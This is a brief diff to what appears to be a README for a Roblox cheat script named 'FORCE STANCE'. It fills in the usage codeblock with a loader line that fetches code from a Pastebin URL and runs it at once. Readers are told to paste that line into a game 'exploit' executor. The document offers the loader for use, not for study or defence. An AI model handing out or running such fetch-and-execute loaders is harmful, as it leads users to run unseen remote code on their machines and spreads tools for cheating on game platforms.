@@ -17,7 +17,7 @@ FORCE STANCE
 
 To use this script, copy the text in the codeblock below and paste it into your exploit. (Usually Takes 5-10 sec. to load)
 
-``` SCRIPT ```
+``` loadstring(game:HttpGet("https://pastebin.com/cyQrN1Yk"))() ```
 
 # Credits
 
